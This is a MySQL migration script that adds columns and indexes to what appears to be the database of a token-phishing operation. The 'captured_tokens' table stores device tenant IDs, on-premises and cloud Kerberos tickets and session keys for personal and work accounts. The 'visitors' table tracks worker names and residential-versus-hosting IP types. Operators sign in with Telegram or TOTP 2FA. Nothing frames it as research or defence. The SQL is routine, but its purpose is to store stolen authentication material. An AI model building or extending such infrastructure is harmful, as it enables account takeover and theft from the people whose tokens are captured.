-- Add missing columns for device proxy and token capture
-- Run this once to add all missing columns

-- For captured_tokens table
SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'device_tenant_id';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN device_tenant_id VARCHAR(255) NULL AFTER session_key_jwe', 'SELECT "Column device_tenant_id already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'tgt_ad';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN tgt_ad TEXT NULL AFTER device_tenant_id', 'SELECT "Column tgt_ad already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'tgt_cloud';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN tgt_cloud TEXT NULL AFTER tgt_ad', 'SELECT "Column tgt_cloud already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'kerberos_top_level_names';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN kerberos_top_level_names TEXT NULL AFTER tgt_cloud', 'SELECT "Column kerberos_top_level_names already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'tgt_cloud_sessionkey';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN tgt_cloud_sessionkey TEXT NULL AFTER kerberos_top_level_names', 'SELECT "Column tgt_cloud_sessionkey already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'account_type';
SET @sql = IF(@col_exists = 0, "ALTER TABLE captured_tokens ADD COLUMN account_type ENUM('personal', 'work_school', 'unknown') DEFAULT 'unknown' AFTER template_type", 'SELECT "Column account_type already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND column_name = 'deleted_at';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE captured_tokens ADD COLUMN deleted_at DATETIME NULL AFTER deleted', 'SELECT "Column deleted_at already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- For visitors table
SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'visitors' AND column_name = 'worker_name';
SET @sql = IF(@col_exists = 0, 'ALTER TABLE visitors ADD COLUMN worker_name VARCHAR(128) NULL AFTER status', 'SELECT "Column worker_name already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'visitors' AND column_name = 'ip_type';
SET @sql = IF(@col_exists = 0, "ALTER TABLE visitors ADD COLUMN ip_type ENUM('residential', 'hosting', 'mobile', 'unknown') DEFAULT 'unknown' AFTER country", 'SELECT "Column ip_type already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- For users table
SET @col_exists = 0;
SELECT COUNT(*) INTO @col_exists FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users' AND column_name = 'two_fa_method';
SET @sql = IF(@col_exists = 0, "ALTER TABLE users ADD COLUMN two_fa_method ENUM('none', 'totp', 'telegram', 'both') DEFAULT 'none' AFTER totp_enabled", 'SELECT "Column two_fa_method already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

-- Create indexes if not exist
SET @idx_exists = 0;
SELECT COUNT(*) INTO @idx_exists FROM information_schema.statistics WHERE table_schema = DATABASE() AND table_name = 'captured_tokens' AND index_name = 'idx_captured_tokens_deleted_at';
SET @sql = IF(@idx_exists = 0, 'CREATE INDEX idx_captured_tokens_deleted_at ON captured_tokens(deleted, deleted_at)', 'SELECT "Index idx_captured_tokens_deleted_at already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;

SET @idx_exists = 0;
SELECT COUNT(*) INTO @idx_exists FROM information_schema.statistics WHERE table_schema = DATABASE() AND table_name = 'visitors' AND index_name = 'idx_visitors_worker';
SET @sql = IF(@idx_exists = 0, 'CREATE INDEX idx_visitors_worker ON visitors(user_id, worker_name, created_at)', 'SELECT "Index idx_visitors_worker already exists"');
PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt;
